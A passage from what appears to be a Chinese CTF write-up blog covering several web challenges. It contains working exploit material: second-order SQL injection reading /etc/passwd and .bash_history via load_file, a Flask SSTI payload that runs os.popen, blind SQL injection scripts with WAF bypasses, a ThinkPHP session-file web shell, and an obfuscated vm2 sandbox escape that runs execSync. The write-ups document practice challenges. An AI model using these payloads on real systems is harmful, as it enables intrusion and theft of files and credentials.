+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写入留言板的信息都被addslashes过滤了没办法突破，继续往下看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">        set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">            content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">            bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现这里的category把已经存入进去的记录直接拿出来用了，也就导致了可以二次注入（因为虽然经过addslashes的过滤，其实它进入数据库里面的格式是不变的只要它取出的时候没有再次经过过滤，就可以二次注入）</p>
+<p>所以我们再写入段直接伪造一个content=执行语句然后让前面闭合就行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在write中category写入</span><br><span class="line">&#x27;,content=user(),/*					#user()处可替换成执行语句</span><br><span class="line"></span><br><span class="line">那要怎么构造闭合呢？</span><br><span class="line">可以在comment的content写入*/#</span><br><span class="line"></span><br><span class="line">他们结合起来就变成了：</span><br><span class="line">insert into comment set category = &#x27;&#x27;,content=user(),/*content = &#x27;*/#&#x27;,bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">这样就导致了前面的闭合以及后面的注释，而中间的content就是我们可以控制的了</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p><img src="/2022/04/09/Comment/3.png" alt="1"></p>
+<p>居然是root权限</p>
+<p>可以直接加载文件，先看看系统命令在哪<code>load_file(&#39;/etc/passwd&#39;)</code></p>
+<p><img src="/2022/04/09/Comment/4.png" alt="1"></p>
+<p>发现在/home/www/这里，直接读历史记录<code>load_file(&#39;/home/www/.bash_history&#39;)</code></p>
+<p><img src="/2022/04/09/Comment/5.png" alt="1"></p>
+<p>发现他删除了<code>.DS_Store</code></p>
+<p>我们知道，他只是删除，而没有释放，这里的缓存文件里面还是有这个文件的，我们只需要访问’/tmp/html/.DS_Store’就能看到这个被删掉的文件内容</p>
+<p>发现有回显，但是显示不全用hex编码一下，拿到里面的内容</p>
+<p><img src="/2022/04/09/Comment/6.png" alt="1"></p>
+<p>然后访问web目录下的这个文件</p>
+<p>然后解码它就可以拿到flag</p>
+]]></content>
+      <tags>
+        <tag>网鼎杯2018</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Double-Secret</title>
+    <url>/2022/04/10/Double-Secret/</url>
+    <content><![CDATA[<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome To Find Secret</span><br></pre></td></tr></table></figure>
+
+<p>找到了robots.txt完全没有有用的信息</p>
+<p>最后发现了secret路由</p>
+<p>进去之后页面提示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so others can&#x27;t see</span><br></pre></td></tr></table></figure>
+
+<p>哈哈结合题目的意思，应该是get传一个参数她会进行加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们输入1的时候返回了d</span><br><span class="line">123 =》 d]</span><br><span class="line">123123</span><br><span class="line">报错了</span><br></pre></td></tr></table></figure>
+
+<p>返回了一些源码信息</p>
+<p><img src="/2022/04/10/Double-Secret/1.png" alt="1"></p>
+<p>可以看到我们的数据会经过RC4解密，而且他给出了他的key</p>
+<p>我们可以直接去解密网站上面直接解密或者是用别人的脚本</p>
+<p>因为这种传入参数的题目一般就集中解法，sql，rce，flask</p>
+<p>这题显然就是flask了，直接用通用payload对她进行RC4加密即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接搜索目录进行os调用就行</p>
+<p>发现加密之后有很多不可见字符，所以需要url编码一下</p>
+<p><img src="/2022/04/10/Double-Secret/2.png" alt="1"></p>
+<p>找到flag直接读取即可</p>
+]]></content>
+      <tags>
+        <tag>CISCN2019</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GYCTF-Ezsqli</title>
+    <url>/2022/04/09/GYCTF-Ezsqli/</url>
+    <content><![CDATA[<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>进去就是输入框输入后发现是以get方式传入id处存在注入</p>
+<p>发现输入0,1,2的回显不同，直接用if构造就可以了</p>
+<p>直接用一个二分法修改一下就行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">url = <span class="string">&quot;http://ed13184f-b49d-4497-aafa-9e2addce4251.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( <span class="literal">True</span> ):</span><br><span class="line">	i = i + <span class="number">1</span> </span><br><span class="line">	head=<span class="number">32</span></span><br><span class="line">	tail=<span class="number">127</span></span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">while</span>( head &lt; tail ):</span><br><span class="line">		mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select database()),%d,1))&gt;%d,1,2)&quot; % (i , mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select group_concat(table_name)from(sys.schema_table_statistics_with_buffer)where(table_schema=database())),%d))&gt;%d,1,2)&quot; % (i , mid)</span></span><br><span class="line">		payload =  <span class="string">&quot;if(ascii(substr((select(flag)from(f1ag_1s_h3r3_hhhhh)),%d,1))&gt;%d,1,2)&quot;</span> % (i, mid)</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&quot;id&quot;</span>: payload</span><br><span class="line">				&#125;</span><br><span class="line">		r = requests.post(url,data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> in r.text:</span><br><span class="line">			head = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			tail = mid</span><br><span class="line">	</span><br><span class="line">	last = result</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">		result += chr(head)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>这里查数据的时候应该要无列名注入的，爆出了库也可以直接猜字段就是flag</p>
+<p>无列名注入看的别的师傅们的wp：</p>
+<p>我这边直接用flag测的，可以直接用</p>
+]]></content>
+      <tags>
+        <tag>GYCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EasyThinking</title>
+    <url>/2022/04/10/EasyThinking/</url>
+    <content><![CDATA[<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>在url页面玩了一阵子，发现了<a class="link" href="http://www.zip/">www.zip<i class="fas fa-external-link-alt"></i></a></p>
+<p>而且他是</p>
+<p><img src="/2022/04/10/EasyThinking/1.png" alt="1"></p>
+<p>发现它使用ThinkPHP框架的，版本号是6.0.0而这个版本存在任意文件写入</p>
+<p>主要是在session处</p>
+<p>然后再看一下下载的源码：</p>
+<p>简单来说主要就是当我们的PHPSESSID的值为32的时候他就会当作文件名</p>
+<p>而在源码中在登录的时候调用到了session也就是说我们在将cookie改成我们自己知道的文件名那么他就会在/tmp/sess_文件名</p>
+<p>创建一个文件，这样我们就可以访问到他了，那么怎么写入数据呢？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$data</span> = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">           <span class="variable">$record</span> = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="variable">$recordArr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">               <span class="variable">$recordLen</span> = sizeof(<span class="variable">$recordArr</span>);</span><br><span class="line">               <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                   array_shift(<span class="variable">$recordArr</span>);</span><br><span class="line">                   session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                   <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现在search路由里面有一个session的保存会将我们输入的东西存储到文件中</p>
+<p>那么我们可以直接在search页面抓包修改cookie以及提交我们的php一句话</p>
+<p>先看看phpinfo有没有什么信息把</p>
+<p><img src="/2022/04/10/EasyThinking/4.png" alt="1"></p>
+<p>发现她过滤了很多函数，</p>
+<p>可以写个一句话然后蚁剑工具bypass</p>
+<p><img src="/2022/04/10/EasyThinking/3.png" alt="1"></p>
+<p><img src="/2022/04/10/EasyThinking/2.png" alt="1"></p>
+<p>执行readflag文件拿到flag</p>
+]]></content>
+      <tags>
+        <tag>GYCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NCTF2019-SQLi</title>
+    <url>/2022/04/10/NCTF2019-SQLi/</url>
+    <content><![CDATA[<p>听名字就知道，是sql注入</p>
+<p>而且题目里面给出了搜索语句，想必他的waf一定很强大吧</p>
+<p>再看看</p>
+<p>在robots.txt里面发现藏了hint.txt</p>
+<p>发现他的waf以及判断条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
+
+<p>只需要我们拿到admin账号的密码即可，但是admin被过滤了，但是想到他们肯定在一张表里面</p>
+<p>空格可以用/**/注释来绕过，最后的单引号可以用未被转义的%00来截断，所以不能在url里面直接填，可以用python脚本里面的unquote来避免他被转义</p>
+<p>可以用<code>\</code>来注释掉前面的东西然后将后面的passwd连接起来即可，or被过滤了，可以用<code>||</code>连接，因为判断直接就是在一张表里面，肯定是用盲注的手法，找到了一个未过滤的regexp（正则匹配）</p>
+<p>regexp常用的匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^a 表示以a开头</span><br><span class="line">a$ 表示以a结尾</span><br><span class="line">| 连接不同的搜索条件</span><br><span class="line">[] 多个搜索条件#[a-d]||[abcd]</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以使用开头判断，如果正确她会有不同回显自己先试了一下看了下回显</p>
+<p>发现在正确的时候她会进入一个404页面</p>
+<p><img src="/2022/04/10/NCTF2019-SQLi/1.png" alt="1"></p>
+<p>应该是跳转页面了，那么直接写脚本判断是否有这个报错就行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://00acf249-e652-45fd-a478-7071f5fb0e1b.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">string = string.ascii_lowercase+string.digits+<span class="string">&#x27;_&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">		data = &#123;</span><br><span class="line">		<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result+j,parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">				&#125;</span><br><span class="line">		<span class="built_in">print</span>(result+j)</span><br><span class="line">		io = requests.post(url,data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> io.text:</span><br><span class="line">			result += j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> j==<span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.text:</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>判断条件就是最后一位为_</p>
+<p>直接输入密码就能拿到flag</p>
+]]></content>
+      <tags>
+        <tag>NCTF2019</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HFCTF2020-JustEscape</title>
+    <url>/2022/04/11/HFCTF2020-JustEscape/</url>
+    <content><![CDATA[<p>进入页面不难看到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看似是一个php页面，但是之前的index页面有提示：</p>
+<p><img src="/2022/04/11/HFCTF2020-JustEscape/1.png" alt="1"></p>
+<p>擦测他应该不是php，而且eval再nodejs中也有</p>
+<p>检测一下是否是nodejs</p>
+<p><img src="/2022/04/11/HFCTF2020-JustEscape/2.png" alt="1"></p>
+<p>果然是nodejs，这一部分还没怎么学，先记录一下，等以后学到了再翻出来看看把</p>
+<p>发现是vm2库的，看了一下，是一个不可靠的沙盒，上网找了找有直接现成的payload再github上面可以直接拿过来修改一下过滤直接打</p>
+<p>因为没怎么看过所以就先直接打一下，等日后学到了再重新做一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+
+<p>因为有过滤，所以直接用拼接的方式打的</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">拼接：</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&#x27;open/System/Applications/Calculator.app/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">requite(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;open/System/Applications/Calculator.app/&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>HFCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Strongest</title>
+    <url>/2022/04/13/Strongest/</url>
+    <content><![CDATA[<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>页面直接就是让我们抓取其中数据输入然后经过一千次检验之后拿到flag</p>
+<p>因为用requests会重置，而且不能错，算错也重置</p>
+<p>可以用selenium库来实现自动化测试</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">firefox = webdriver.Firefox()</span><br><span class="line">url = <span class="string">&quot;http://e61e9d17-6d5e-4c15-86a8-e69cacfebb55.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firefox.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1010</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    result = firefox.find_element(By.XPATH, <span class="string">&#x27;/html/body/center&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    info = result.text</span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line"></span><br><span class="line">    number = re.findall(<span class="string">&quot;\d+&quot;</span>, info)    <span class="comment"># 输出结果为列表</span></span><br><span class="line">    <span class="built_in">print</span>(number)</span><br><span class="line"></span><br><span class="line">    left = number[<span class="number">1</span>]</span><br><span class="line">    right = number[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(right)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> info:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            flag = <span class="built_in">int</span>(left) + <span class="built_in">int</span>(right)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            flag = <span class="built_in">int</span>(left) - <span class="built_in">int</span>(right)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="comment"># 模拟输入</span></span><br><span class="line">    res_input = firefox.find_element(By.CLASS_NAME, <span class="string">&#x27;form-control&#x27;</span>)</span><br><span class="line">    res_input.send_keys(flag)</span><br><span class="line"></span><br><span class="line">    res_input.send_keys(Keys.ENTER) <span class="comment">#回车键Enter</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>GXYCTF2019</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bestphp&#39;s-revenge</title>
+    <url>/2022/04/11/bestphp-s-revenge/</url>
+    <content><![CDATA[<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>看懂了他的原理所以记录一下，日后复现的时候可以看看有什么差漏。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>扫到目录flag.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
+
+<p>就猜测应该是需要用ssrf了</p>
